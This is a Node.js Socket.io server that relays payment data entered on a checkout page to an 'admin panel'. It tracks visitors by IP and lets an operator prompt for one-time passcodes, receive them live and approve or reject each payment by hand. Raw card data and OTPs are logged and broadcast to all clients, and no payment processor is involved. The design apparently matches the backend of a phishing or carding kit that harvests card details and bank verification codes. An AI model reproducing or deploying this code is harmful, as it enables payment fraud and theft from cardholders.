import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const server = createServer(app);

// Configure CORS for Socket.io based on environment
const corsOptions = {
  origin: process.env.NODE_ENV === 'production' 
    ? true // Allow all origins in production (Render.com handles HTTPS)
    : ["http://localhost:5173", "http://localhost:3000"],
  methods: ["GET", "POST"],
  credentials: true
};

const io = new Server(server, {
  cors: corsOptions,
  transports: ['websocket', 'polling']
});

// Serve static files from the dist directory in production
if (process.env.NODE_ENV === 'production') {
  app.use(express.static(path.join(__dirname, 'dist')));
  
  // Handle React routing - serve index.html for all non-API routes
  app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
  });
}

// Track active visitors
const activeVisitors = new Map();

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log('User connected:', socket.id);

  // Handle payment data from checkout page
  socket.on('payment-data', (data) => {
    console.log('Payment data received:', data);
    
    // Emit to admin panel (broadcast to all connected clients)
    socket.broadcast.emit('payment-received', data);
  });

  // Handle visitor tracking
  socket.on('visitor-joined', (data) => {
    console.log('Visitor joined:', data);
    
    // Store visitor data
    activeVisitors.set(socket.id, {
      ...data,
      socketId: socket.id,
      id: Date.now().toString() + Math.random().toString(36).substr(2, 9)
    });
    
    // Emit to admin panel (broadcast to all connected clients)
    io.emit('visitor-joined', activeVisitors.get(socket.id));
  });

  socket.on('visitor-left', (data) => {
    console.log('Visitor left:', data);
    
    // Remove visitor from active list
    const visitor = activeVisitors.get(socket.id);
    if (visitor) {
      activeVisitors.delete(socket.id);
      socket.broadcast.emit('visitor-left', { id: visitor.id, ipAddress: visitor.ipAddress });
    }
  });

  // Handle visitor heartbeat to keep them active
  socket.on('visitor-heartbeat', (data) => {
    const visitor = activeVisitors.get(socket.id);
    if (visitor) {
      visitor.lastHeartbeat = new Date().toISOString();
    }
  });

  // Handle admin actions
  socket.on('show-otp', (data) => {
    console.log('Admin requested OTP:', data);
    socket.broadcast.emit('show-otp');
  });

  socket.on('approve-payment', (data) => {
    console.log('Admin approved payment:', data);
    socket.broadcast.emit('payment-approved');
  });

  socket.on('reject-payment', (data) => {
    console.log('Admin rejected payment:', data);
    socket.broadcast.emit('payment-rejected', data.reason);
  });

  // Handle OTP submission
  socket.on('otp-submitted', (data) => {
    console.log('OTP submitted:', data);
    socket.broadcast.emit('otp-received', data);
  });

  socket.on('disconnect', () => {
    console.log('User disconnected:', socket.id);
    
    // Remove visitor from active list on disconnect
    const visitor = activeVisitors.get(socket.id);
    if (visitor) {
      activeVisitors.delete(socket.id);
      io.emit('visitor-left', { id: visitor.id, ipAddress: visitor.ipAddress });
    }
  });
});

// Health check endpoint for Render.com
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
});

const PORT = process.env.PORT || 3001;

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
});
